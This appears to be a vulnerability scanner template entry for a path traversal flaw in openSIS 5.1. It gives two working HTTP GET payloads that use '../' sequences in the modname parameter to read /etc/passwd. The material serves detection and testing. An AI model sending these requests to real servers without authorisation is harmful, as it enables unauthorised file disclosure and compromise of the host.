# Nuclei Template: openSIS 5.1 - Local File Inclusion
**Template ID:** opensis-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`opensis-lfi.yaml`)

## Vulnerability Information & PoC

## Description
openSIS 5.1 is vulnerable to local file inclusion and allows attackers to obtain potentially sensitive information by executing arbitrary local scripts in the context of the web server process. This may allow the attacker to compromise the application and computer; other attacks are also possible.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
GET {{BaseURL}}/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
```

## References
- https://www.exploit-db.com/exploits/38039
